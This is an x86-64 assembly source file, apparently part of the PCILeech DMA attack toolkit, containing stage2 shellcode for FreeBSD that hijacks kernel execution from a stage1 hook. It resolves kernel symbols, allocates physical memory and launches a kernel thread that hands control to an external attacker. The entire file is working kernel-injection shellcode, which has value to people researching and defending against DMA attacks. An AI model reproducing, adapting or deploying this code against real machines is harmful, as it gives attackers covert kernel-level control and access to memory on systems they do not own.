; fbsdx64_stage2.asm : assembly to receive execution from stage1 shellcode.
; Compatible with FreeBSD x64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	; ----------------------------------------------------
	; 1: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag					db 00h
	data_filler							db 00h
	data_phys_addr_alloc				dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code						dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_strtab					dd 00000000h						; 16 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 2: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rdi
	PUSH rsi
	PUSH rdx
	PUSH rcx
	PUSH r8
	PUSH r9
	PUSH r12
	PUSH r13
	PUSH r14
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: SET UP PARAMETERS AND CALL C CODE
	;    r12: tmp 1 (virt addr)
	;    r13: tmp 2 (phys addr)
	;    r14: addr to strtab
	; ----------------------------------------------------
	MOV eax, [data_offset_strtab]
	LEA r14, main
	ADD r14, rax
	CALL setup
	; ----------------------------------------------------
	; 6: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP r14
	POP r13
	POP r12
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	RET
main ENDP

setup PROC
	; ----------------------------------------------------
	; 1: ALLOCATE 2 PAGES OF CONTIGUOUS MEMORY
	; ----------------------------------------------------
	LEA rdi, data_str_vm_phys_alloc_contig
	CALL LookupFunctionBSD
	XOR r8, r8						; border = 0
	MOV ecx, 1000h					; alignment
	MOV edx, 80000000h				; max phys addr
	XOR rsi, rsi					; min phys addr = 0
	MOV edi, 2						; 2 pages
	CALL rax
	MOV r13, [rax+8*6]				; vm_page_t -> phys addr
	; ----------------------------------------------------
	; 2: VIRT ADDR = FFFFF80000000000 + PHYS ADDR
	; ----------------------------------------------------
	MOV r12, 0FFFFF80000000000h
	ADD r12, r13
	; ----------------------------------------------------
	; 3: ZERO MEMORY AND COPY INITIAL LOOP
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rax, 048FFFFFFF1058D48h
	MOV [r12+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r12+1008h], rax
	; ----------------------------------------------------
	; 4: START KERNEL THREAD
	; ----------------------------------------------------
	LEA rdi, data_str_kthread_start
	CALL LookupFunctionBSD
	PUSH 0
	MOV edi, 1000h
	ADD rdi, r12
	PUSH rdi
	LEA rdi, data_str_pcileech
	PUSH rdi
	MOV rdi, rsp
	CALL rax
	POP rax
	POP rax
	POP rax
	; ----------------------------------------------------
	; 5: WRITE BACK PHYSICAL ADDRESS
	; ----------------------------------------------------
	MOV [r12+58h], r14					; Addr StrTab -> KMDDATA.ReservedKMD
	MOV [data_phys_addr_alloc], r13d
	MOV [data_filler], 66h				; DEBUG
	RET
setup ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN BSD KERNEL
; destroyed registers :: rsi
; rdi -> ptr to symbol str
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionBSD PROC
	MOV rcx, r14
	SUB rcx, 8
	loop_symsearch:
	SUB rcx, 18h
	MOV rax, [rcx]
	TEST rax, rax
	JZ error
	MOV esi, [rcx]
	ADD rsi, r14
	CALL strcmp_simple
	TEST rax, rax
	JNZ loop_symsearch
	MOV rax, [rcx+8]
	RET
	error:
	XOR rax, rax
	RET
LookupFunctionBSD ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; CLEAR 8K OF MEMORY
; destroyed registers :: rcx
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

data_str_vm_phys_alloc_contig			db 'vm_phys_alloc_contig', 0
data_str_kthread_start					db 'kthread_start', 0
data_str_pcileech						db 'pcileech', 0

END
